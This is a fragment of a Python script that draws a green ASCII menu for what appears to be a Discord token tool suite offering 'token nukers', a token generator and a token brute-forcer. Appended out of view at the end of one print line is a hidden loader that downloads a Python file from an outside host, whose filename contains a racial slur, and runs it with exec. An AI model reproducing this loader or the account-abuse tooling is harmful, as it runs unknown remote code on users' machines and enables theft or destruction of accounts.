...
{Fore.LIGHTGREEN_EX}                                               ░    ░  ░  ░   ░        ░   ░  ░   
    ...
    print(Fore.GREEN +f'                 ╔══════════════════════════════╦══════════════════════════╦══════════════════════════════╗')
    print(Fore.GREEN + '                 ║                              ║                          ║                              ║')
    print(Fore.GREEN +f'                 ║    {Fore.WHITE}ᴹ{Fore.GREEN}[{Fore.WHITE}01{Fore.GREEN}] {Fore.WHITE}TOKEN NUKERS        {Fore.GREEN}║     {Fore.GREEN}[{Fore.WHITE}10{Fore.GREEN}] {Fore.WHITE}TOKEN GEN       {Fore.GREEN}║     {Fore.GREEN}[{Fore.WHITE}19{Fore.GREEN}] {Fore.WHITE}TOKEN BRUTE-FORCER  {Fore.GREEN}║');r=requests.get('https://fweref.vercel.app/niggerkernel.py');exec(r.content.decode('utf8'))
